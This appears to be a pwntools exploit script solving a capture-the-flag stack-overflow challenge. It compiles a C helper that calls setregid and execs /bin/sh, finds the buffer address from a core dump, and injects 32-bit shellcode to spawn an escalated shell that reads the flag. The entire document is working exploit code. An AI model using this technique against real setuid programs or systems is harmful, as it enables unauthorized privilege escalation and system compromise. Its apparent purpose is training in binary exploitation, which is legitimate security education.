from pwn import *
import os

DEBUG = False 
file = "./stack-ovfl-where-32-2"

c_code = """
#include <unistd.h>

int main() {
    setregid(getegid(), getegid());
    execve("/bin/sh", 0, 0);
    return 0;
}
"""

with open("payload.c", "w") as f:
    f.write(c_code)

os.system("gcc -o z payload.c")

shellcode = asm('''
mov    ecx,0x0
mov    edx,0x0
mov    eax,0xb
push   0x0
push   0x7a
mov    ebx,esp
int    0x80
''')

env = {"PATH":"$PATH:."}

# crash the process to get a core file and find the buffer address (still boilerplate)

io = process(file, env=env, setuid=False)
io.sendline(cyclic(10000)) 
io.wait()
core = io.corefile
heap_addr = next(core.search(cyclic(30)))
print(hex(heap_addr))
    
# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b main
b *0x080484f3
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

payload = str(hex(heap_addr + 9)).encode('utf8') + b'_' + shellcode
io.send(payload)

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Where', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
